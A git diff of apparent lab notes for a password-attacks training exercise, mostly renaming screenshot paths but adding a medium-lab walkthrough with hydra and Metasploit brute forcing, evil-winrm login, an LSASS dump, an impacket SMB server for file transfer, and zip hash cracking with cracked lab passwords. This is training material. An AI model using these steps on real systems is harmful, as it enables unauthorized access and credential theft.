@@ -30,12 +30,12 @@
 
     <figure><img src=".gitbook/assets/image (14) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * /etc/passwd
 *
 
-    <figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -43,7 +43,7 @@
 
 #### Windows
 
-<figure><img src=".gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * LSASS
 * SAM database
@@ -67,13 +67,13 @@ Find the user for the **WinRM** service and crack their password. Then, when you
 
 `evil-winrm -u john -i 10.129.218.11 -p november`
 
-<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
 Find the user for the **SSH** service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.
 
 `hydra -L username.list -P password.list ssh://10.129.238.248`
 
-<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 `ssh dennis@10.129.238.248`
 
@@ -85,7 +85,7 @@ Find the user for the **RDP** service and crack their password. Then, when you l
 
 `hydra -L username.list -P password.list rdp://10.129.238.248`
 
-<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 Reminna to login
 
@@ -109,7 +109,7 @@ Find the user for the **SMB** service and crack their password. Then, when you l
 
 `run`
 
-<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
 
@@ -277,14 +277,14 @@ Then we can crack the NT Hash with Hashcat
 * Task manager
   *   LSASS -> right-click -> Create dump file
 
-      <figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+      <figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-      <figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+      <figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 *   File transfer to our attack Linux machine from Windows RDP...
 
     * sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/zihuatanejo
 
-    <figure><img src=".gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src=".gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -800,6 +800,58 @@ passphrase: same as password
 
 ### PW Attacks lab - MEDIUM
 
+**Examine the second target and submit the contents of flag.txt in /root/ as the answer.**
 
+`nmap -sVC 10.129.202.221`
+
+<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+* SSH, SMB
+
+METASPLOIT
+
+`msfconsole -q`
+
+`use auxiliary/scanner/smb/smb_login`
+
+`options`
+
+`set user_file username.list`
+
+`set pass_file password.list`
+
+`set rhosts 10.129.238.248`
+
+`run`
+
+<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+`smbclient \\\\10.129.202.221\\SHAREDRIVE -U john`
+
+&#x20;![](<.gitbook/assets/image (2).png>)
+
+`smbclient \\10.129.202.221\SHAREDRIVE -U john%123456 -c 'get Docs.zip'`
+
+`unzip`
+
+\----PW-----
+
+zip2john Docs.zip > docs.hash
+
+hashcat --force password.list -r custom.rule --stdout | sort -u > mut\_password.list
+
+john --wordlist=mut\_password.list docs.has
+
+* PW = Destiny2022!
+
+unzip&#x20;
+
+open Documentation.docx
+
+* jason:
+
+ssh jason@10.129.202.221
+
+mysql -u jason -p&#x20;
 
 ### PW Attacks lab - HARD
